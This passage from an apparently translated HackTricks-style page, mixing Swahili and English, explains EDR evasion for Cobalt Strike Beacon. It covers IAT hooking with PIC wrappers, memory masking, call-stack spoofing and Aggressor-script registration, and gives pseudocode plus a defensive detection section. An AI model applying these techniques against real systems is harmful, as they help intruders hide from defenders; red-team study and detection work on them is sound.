- Kila PIC wrapper hufanya mbinu za kukwepa utambuzi kabla ya tail‑calling anwani halisi ya API. Mbinu za kawaida ni pamoja na:
  - Memory mask/unmask karibu na wito (mf., encrypt beacon regions, RWX→RX, badilisha majina/idhinishaji ya kurasa) kisha rejesha baada ya wito.
  - Call‑stack spoofing: unda stack isiyo na hatari na uhamishe kwenye API lengwa ili uchambuzi wa call‑stack uonekane kwa fremu zinazotarajiwa.
- Kwa ulinganifu, toa interface ili script ya Aggressor (au sawa nayo) iweze kusajili ni API zipi za ku-hook kwa Beacon, BOFs na post‑ex DLLs.

Why IAT hooking here
- Inafanya kazi kwa code yoyote inayotumia import iliyohookiwa, bila kuharibu code ya zana au kutegemea Beacon ku-proxy API maalum.
- Inashughulikia post‑ex DLLs: ku-hook LoadLibrary* hukuwezesha kukamata upakiaji wa moduli (mf., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion ile ile kwa wito wao wa API.
- Inarejesha matumizi ya kuaminika ya amri za post‑ex zinazozalisha michakato dhidi ya utambuzi unaotegemea call‑stack kwa kuzunguka CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Uunganishaji wa kiutendaji
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Vipengele na mifano zinazohusiana
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
